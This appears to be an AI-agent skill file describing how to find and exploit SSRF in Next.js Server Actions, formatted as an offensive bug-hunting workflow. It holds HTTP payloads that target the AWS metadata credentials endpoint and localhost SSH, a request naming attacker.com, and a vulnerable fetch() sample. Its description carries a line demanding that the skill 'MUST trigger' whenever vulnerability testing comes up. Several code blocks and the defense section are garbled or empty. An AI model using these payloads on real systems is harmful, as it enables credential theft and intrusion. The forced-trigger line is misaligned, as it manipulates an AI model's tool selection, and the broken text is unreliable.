---
name: ssrf-nextjs-server-actions
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Identify and exploit Server-Side Request Forgery (SSRF) vulnerabilities in Next.js 
  applications, specifically focusing on insecure server actions or API routes fetching 
  user-controlled URLs on the server-side.
domain: cybersecurity
subdomain: bug-hunting
category: Web Vulnerabilities
difficulty: intermediate
estimated_time: "2-3 hours"
mitre_attack:
  tactics: [TA0001, TA0040]
  techniques: [T1190, T1566]
platforms: [web, nextjs]
tags: [ssrf, nextjs, web-security, bug-hunting, server-actions, react]
tools: [burp-suite, custom-scripts]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# SSRF via Next.js Server Actions

## When to Use
- When auditing modern web applications built using Next.js (React framework) that utilize Server Actions or custom API routes (`/pages/api` or `/app/api`).
- To demonstrate how fetching external data based on user input on the server side can lead to SSRF, allowing access to internal networks or cloud metadata.

## Workflow

### Phase 1: Identifying Server Actions

```text
# Concept: Next.js Server Actions ```

### Phase 2: Analyzing Request Payloads (Black Box)

```http
# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "https://attacker.com/image.png"}]
```

### Phase 3: Code Review (White Box - if available)

```javascript
# Sink: fetch() 'use server'

export async function fetchPreview(url) {
  // VULNERABLE const res = await fetch(url);
  const data = await res.text();
  return { preview: data.substring(0, 100) };
}
```

### Phase 4: Exploitation

```http
# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}]

# POST / HTTP/1.1
Host: target.com
Content-Type: text/plain;charset=UTF-8
Next-Action: xxxxxxxx

[{"url": "http://127.0.0.1:22"}]
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Monitor Next-Action ] --> B{Accepts URL Input ]}
    B -->|Yes| C[Test internal ]
    B -->|No| D[Test parameter ]
    C --> E[Exfiltrate ]
```

## 🔵 Blue Team Detection & Defense
- **URL Allowlisting**: - **SSRF Protections (Network Level)**: Key Concepts
| Concept | Description |
|---------|-------------|
| Server Actions | |
| SSRF (Server-Side Request Forgery) | |

## References
- PortSwigger: [SSRF](https://portswigger.net/web-security/ssrf)
- Next.js Security: [Server Actions Security](https://nextjs.org/docs/app/building-your-application/data-fetching/server-actions-and-mutations#security)
